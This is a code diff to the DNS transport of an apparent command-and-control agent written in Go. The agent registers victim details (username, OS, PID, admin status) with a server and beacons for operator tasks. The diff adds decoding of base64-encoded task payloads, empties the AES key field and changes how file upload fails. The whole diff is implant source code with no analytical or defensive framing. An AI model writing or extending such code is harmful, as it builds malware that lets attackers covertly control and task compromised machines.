@@ -4,6 +4,7 @@ package agent
 
 import (
 	"encoding/base32"
+	"encoding/base64"
 	"encoding/json"
 	"fmt"
 	"net"
@@ -47,7 +48,6 @@ func newDNSTransport() *dnsTransport {
 // ── transport interface ───────────────────────────────────────────────────
 
 func (d *dnsTransport) register(info sysInfo) error {
-	key := make([]byte, 32)
 	// generate agent ID from hostname + pid
 	d.agentID = agentIDFromInfo(info)
 
@@ -63,7 +63,7 @@ func (d *dnsTransport) register(info sysInfo) error {
 		Username: info.Username,
 		OS:       info.OS,
 		PID:      info.PID,
-		AESKey:   strings.ToLower(b32enc.EncodeToString(key)),
+		AESKey:   "",
 		IsAdmin:  info.IsAdmin,
 	}
 	data, err := json.Marshal(payload)
@@ -117,14 +117,23 @@ func (d *dnsTransport) beacon() ([]taskWire, error) {
 		return nil, fmt.Errorf("b32 decode: %w", err)
 	}
 	var tw struct {
-		ID   int64  `json:"id"`
-		Type string `json:"type"`
-		Args string `json:"args"`
+		ID      int64  `json:"id"`
+		Type    string `json:"type"`
+		Args    string `json:"args"`
+		Payload string `json:"payload"`
 	}
 	if err := json.Unmarshal(decoded, &tw); err != nil {
 		return nil, fmt.Errorf("json: %w", err)
 	}
-	return []taskWire{{ID: tw.ID, Type: tw.Type, Args: tw.Args}}, nil
+	var payload string
+	if tw.Payload != "" {
+		decodedPayload, err := base64.StdEncoding.DecodeString(tw.Payload)
+		if err != nil {
+			return nil, fmt.Errorf("payload base64: %w", err)
+		}
+		payload = string(decodedPayload)
+	}
+	return []taskWire{{ID: tw.ID, Type: tw.Type, Args: tw.Args, Payload: payload}}, nil
 }
 
 func (d *dnsTransport) sendResultAdmin(taskID int64, output, errStr string, _ bool) error {
@@ -156,8 +165,7 @@ func (d *dnsTransport) sendResult(taskID int64, output, errStr string) error {
 }
 
 func (d *dnsTransport) uploadFile(taskID int64, filename string, data []byte) error {
-	// DNS transport doesn't support file upload; send base64 in output
-	return d.sendResult(taskID, fmt.Sprintf("file:%s:size=%d", filename, len(data)), "upload-not-supported-over-dns")
+	return fmt.Errorf("upload not supported over DNS transport")
 }
 
 func (d *dnsTransport) downloadFile(filename string) ([]byte, error) {
